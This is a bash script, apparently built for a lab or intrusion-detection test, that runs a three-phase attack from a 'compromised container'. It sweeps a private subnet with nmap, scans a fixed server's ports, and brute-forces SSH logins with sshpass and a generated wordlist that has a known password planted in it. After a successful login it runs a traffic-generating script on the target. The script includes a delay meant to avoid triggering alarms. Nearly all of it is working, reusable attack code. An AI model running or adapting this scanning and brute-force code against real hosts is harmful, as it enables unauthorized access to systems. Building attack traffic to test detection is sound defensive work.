#!/bin/bash

# Attack script for compromised container
# Performs: 1) Network discovery, 2) SSH port discovery, 3) Brute force attack

set -e

# Configuration
SERVER_IP="172.31.0.10"
COMPROMISED_IP="172.30.0.10"
WORDLIST_FILE="/tmp/wordlist.txt"
CORRECT_PASSWORD="adminadmin"
SSH_USER="admin"
LOG_FILE="/tmp/attack_log.txt"

# Create a wordlist with 250 passwords including the correct one
create_wordlist() {
    echo "Creating wordlist with 250 passwords..."

    # Common passwords to make up the bulk of the list
    cat > "$WORDLIST_FILE" << 'EOF'
123456
password
qwerty
admin
letmein
welcome
monkey
1234567890
password123
abc123
111111
123123
dragon
master
hello
freedom
whatever
qazwsx
trustno1
123qwe
zxcvbn
sunshine
iloveyou
princess
football
baseball
shadow
superman
michael1
ninja
asdfgh
jessica
lovely
654321
pokemon
slayer
helpme
131313
killer
trustno1
welcome
samantha
matrix
dallas
austin
thunder
tigger
mickey
george
191919
chicago
jordan
liverpool
internet
soccer
harley
nicole
daniel
abgrtyu
merlin
heaven
michael1
ranger
diamond
corvette
ernie
hammer
ferrari
alexander
buster
teddy
sunset
tester
william
patrick
marlboro
scooter
sammy
matrix
kitten
tiger
rabbit
patrick
merlin
chicken
buster
ferrari
diamond
bastian
arturo
ranger
hammer
summer
broncos
cowboys
yankees
jordan
cameron
soccer
football
baseball
tennis
guitar
player
mustang
silver
golden
eagle
warrior
panther
tornado
lightning
thunder
hurricane
volcano
earthquake
tsunami
blizzard
wildfire
avalanche
landslide
explosive
dynamite
nitro
fusion
reactor
plasma
laser
phaser
tractor
bulldozer
excavator
helicopter
airplane
submarine
battleship
aircraft
missile
torpedo
grenade
sniper
assassin
warrior
champion
victory
triumph
conquest
dominion
supremacy
ultimate
infinity
eternal
legendary
mystical
magical
fantastic
wonderful
amazing
incredible
fantastic
extraordinary
spectacular
magnificent
phenomenal
outstanding
remarkable
exceptional
unbelievable
astonishing
breathtaking
awe-inspiring
mind-boggling
earth-shattering
groundbreaking
revolutionary
innovative
cutting-edge
state-of-the-art
advanced
sophisticated
complex
intricate
complicated
challenging
difficult
impossible
unbreakable
invincible
unstoppable
indestructible
immortal
eternal
infinite
limitless
boundless
endless
timeless
ageless
ancient
primeval
prehistoric
medieval
modern
futuristic
advanced
superior
ultimate
extreme
maximum
minimum
optimal
perfect
ideal
flawless
impeccable
pristine
pure
sacred
divine
holy
blessed
cursed
damned
forbidden
taboo
secret
mystery
enigma
puzzle
riddle
challenge
obstacle
barrier
threshold
gateway
portal
 doorway
entrance
exit
escape
freedom
liberty
justice
truth
wisdom
knowledge
power
strength
courage
bravery
honor
glory
fame
fortune
wealth
success
victory
triumph
achievement
accomplishment
fulfillment
satisfaction
happiness
joy
bliss
ecstasy
rapture
paradise
heaven
nirvana
eden
utopia
shangri-la
atlantis
avalon
camelot
elysium
valhalla
olympus
asgard
midgard
niflheim
muspelheim
alfheim
svartalfheim
nidavellir
helheim
jotunheim
vanaheim
EOF

      # Insert the correct password at position 1 if first-try mode, otherwise random position
    if [[ "$FIRST_TRY" == "true" ]]; then
        echo "$CORRECT_PASSWORD" | cat - "$WORDLIST_FILE" > temp && mv temp "$WORDLIST_FILE"
        echo "Wordlist created with $(wc -l < "$WORDLIST_FILE") passwords"
        echo "First-try mode: Correct password '$CORRECT_PASSWORD' is at position: $(grep -n "^$CORRECT_PASSWORD$" "$WORDLIST_FILE" | cut -d: -f1)"
    else
        CORRECT_POS=$((1 + RANDOM % 250))
        echo "$CORRECT_PASSWORD" | sed -i "${CORRECT_POS}i $CORRECT_PASSWORD" "$WORDLIST_FILE"

        # Shuffle the wordlist randomly
        shuf "$WORDLIST_FILE" -o "$WORDLIST_FILE"

        echo "Wordlist created with $(wc -l < "$WORDLIST_FILE") passwords"
        echo "Correct password '$CORRECT_PASSWORD' is at position: $(grep -n "^$CORRECT_PASSWORD$" "$WORDLIST_FILE" | cut -d: -f1)"
    fi
}

# Log function
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Trap signals to exit gracefully
cleanup() {
    log_message "Attack interrupted - cleaning up..."
    # Create summary even if interrupted
    if [[ -n "$ATTACK_ID" ]]; then
        cat > /tmp/attack_summary.json << EOF
{
    "attack_id": "$ATTACK_ID",
    "attacker_ip": "$COMPROMISED_IP",
    "target_ip": "$SERVER_IP",
    "start_time": "$START_TIME",
    "end_time": "$(date -Iseconds)",
    "phases_completed": "interrupted",
    "success": "interrupted",
    "log_file": "$LOG_FILE"
}
EOF
    fi
    exit 130
}

# Set up signal handlers
trap cleanup INT TERM

# Don't trap EXIT to avoid double cleanup when timeout kills the process

# Attack phases
attack_phase_1() {
    log_message "Phase 1: Network discovery - Aggressive scanning for hosts in 172.31.0.0/24"
    nmap -sP 172.31.0.0/24 -oN /tmp/nmap_discovery.txt
    log_message "Phase 1 completed"
}

attack_phase_2() {
    log_message "Phase 2: Aggressive port scanning - Looking for SSH on server $SERVER_IP"
    nmap -sV -Pn "$SERVER_IP" -oN /tmp/nmap_ports.txt
    log_message "Phase 2 completed"
}

attack_phase_3() {
    log_message "Phase 3: Brute force attack - Starting SSH brute force on $SERVER_IP:22"
    log_message "Using wordlist with $(wc -l < "$WORDLIST_FILE") passwords"

    # Ensure ssh client is available
    if ! command -v ssh &> /dev/null; then
        log_message "Installing openssh-client..."
        apt-get update > /dev/null 2>&1
        apt-get install -y openssh-client > /dev/null 2>&1
        log_message "SSH client installation completed"
    fi

    # Simple SSH brute force script
    attempt=1
    total_passwords=$(wc -l < "$WORDLIST_FILE")
    success="false"

    log_message "Starting brute force with $total_passwords passwords"

    while IFS= read -r password; do
        # Skip empty lines
        [[ -z "$password" ]] && continue

        log_message "Attempt $attempt/$total_passwords: Trying password '$password'"

        # Use sshpass for non-interactive SSH login
        if ! command -v sshpass &> /dev/null; then
            log_message "Installing sshpass..."
            apt-get update > /dev/null 2>&1
            apt-get install -y sshpass > /dev/null 2>&1
        fi

        # Attempt SSH connection with timeout and strict host key checking disabled
        output_file="/tmp/ssh_attempt_$attempt.log"
        if timeout 5 sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 -o BatchMode=no -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no -o ServerAliveInterval=1 -o ServerAliveCountMax=1 \
            "$SSH_USER"@"$SERVER_IP" "exit" > "$output_file" 2>&1; then

            log_message "SUCCESS: Password found! '$password' is the correct password"
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] SUCCESS: Password '$password' found for $SSH_USER@$SERVER_IP:22 (attempt $attempt)" >> /tmp/hydra_results.txt

            # NEW PHASE: Large file transfer to confirm successful SSH connection
            log_message "Starting large file transfer phase to demonstrate successful SSH access..."

            # Create a large script file on the attacker machine first
            LARGE_SCRIPT="/tmp/large_script.sh"
            log_message "Creating large script file (~50KB) for transfer..."

            cat > "$LARGE_SCRIPT" << 'EOF'
#!/bin/bash
# Large script for testing SSH file transfer detection
# This script generates significant network traffic when transferred via SSH

echo "=========================================================="
echo "LARGE SCRIPT EXECUTION STARTED"
echo "=========================================================="

# Generate lots of output to create network traffic
for i in {1..1000}; do
    echo "Processing data chunk $i: This is a large amount of text to simulate file transfer operations over SSH connection"

    # Generate some random data
    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | base64 | head -c 50

    echo "Intermediate result $i: $(date)"

    # Create some dummy file content
    echo "Dummy file content for line $i with lots of padding text to make it larger and more detectable in network traffic analysis" >> /tmp/dummy_output.txt

    if (( i % 100 == 0 )); then
        echo "Progress checkpoint: $i/1000 completed"
        df -h
        ps aux | head -5
        whoami
        pwd
        ls -la /tmp/ | head -10
    fi

    sleep 0.1
done

echo "=========================================================="
echo "LARGE SCRIPT EXECUTION COMPLETED"
echo "=========================================================="

# Additional large operations to generate more traffic
echo "Starting system information collection..."
uname -a > /tmp/system_info.txt
cat /proc/version >> /tmp/system_info.txt
cat /proc/meminfo >> /tmp/system_info.txt
cat /proc/cpuinfo >> /tmp/system_info.txt

# Create another large file
for j in {1..500}; do
    echo "Large data entry $j: $(date) - Random padding text to make this file bigger and easier to detect in network traffic analysis" >> /tmp/large_data_file.txt
done

echo "All operations completed successfully. SSH connection was established and used for large file transfers."
EOF

            # Transfer and execute the large script via SSH
            log_message "Transferring large script to target server and executing..."
            if sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=10 -o BatchMode=no \
                "$SSH_USER"@"$SERVER_IP" "bash -s" < "$LARGE_SCRIPT" > /tmp/large_script_output.log 2>&1; then
                log_message "Large script transfer and execution completed successfully"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] LARGE_FILE_TRANSFER: Successfully transferred and executed large script via SSH" >> /tmp/hydra_results.txt
            else
                log_message "Large script transfer failed, but SSH connection was successful"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] LARGE_FILE_TRANSFER: Failed but SSH auth was successful" >> /tmp/hydra_results.txt
            fi

            success="true"
            break
        else
            # Log the error for debugging
            ssh_result=$(cat "$output_file" 2>/dev/null || echo "No output")
            if [[ $attempt -le 5 || $((attempt % 50)) -eq 0 ]]; then
                log_message "Attempt $attempt failed: ${ssh_result:0:100}..."
            fi
            rm -f "$output_file" 2>/dev/null
        fi

        attempt=$((attempt + 1))

        # Add a delay between attempts to avoid triggering too many alarms and reduce resource usage
        sleep 0.5

    done < "$WORDLIST_FILE"

    if [ "$success" = "true" ]; then
        log_message "Phase 3 completed - SUCCESS: Password found!"
        SUCCESS="true"
    else
        log_message "Phase 3 completed - FAILED: No password found"
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] FAILED: No valid password found for $SSH_USER@$SERVER_IP:22" >> /tmp/hydra_results.txt
        SUCCESS="false"
    fi
}

# Main execution
main() {
    log_message "Starting attack sequence from $COMPROMISED_IP targeting $SERVER_IP"
    log_message "Attack started at $(date)"

    # Create wordlist
    create_wordlist

    # Phase 1: Network discovery
    attack_phase_1

    # Wait a bit between phases
    sleep 5

    # Phase 2: Port discovery
    attack_phase_2

    # Wait a bit between phases
    sleep 5

    # Phase 3: Brute force
    attack_phase_3

    log_message "Attack completed at $(date)"
    log_message "Final result: $SUCCESS"

    # Create summary
    cat > /tmp/attack_summary.json << EOF
{
    "attack_id": "$ATTACK_ID",
    "attacker_ip": "$COMPROMISED_IP",
    "target_ip": "$SERVER_IP",
    "start_time": "$START_TIME",
    "end_time": "$(date -Iseconds)",
    "phases_completed": 3,
    "success": $SUCCESS,
    "wordlist_size": $(wc -l < "$WORDLIST_FILE"),
    "correct_password": "$CORRECT_PASSWORD",
    "log_file": "$LOG_FILE"
}
EOF

    echo "Attack summary saved to /tmp/attack_summary.json"
}

# Initialize variables
ATTACK_ID=""
FIRST_TRY="false"
START_TIME="$(date -Iseconds)"
SUCCESS="false"

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --first-try)
            FIRST_TRY="true"
            shift
            ;;
        *)
            if [[ -z "$ATTACK_ID" ]]; then
                ATTACK_ID="$1"
            fi
            shift
            ;;
    esac
done

# Set default attack ID if not provided
if [[ -z "$ATTACK_ID" ]]; then
    ATTACK_ID=$(date +%s)
fi

# Run the attack
main "$@"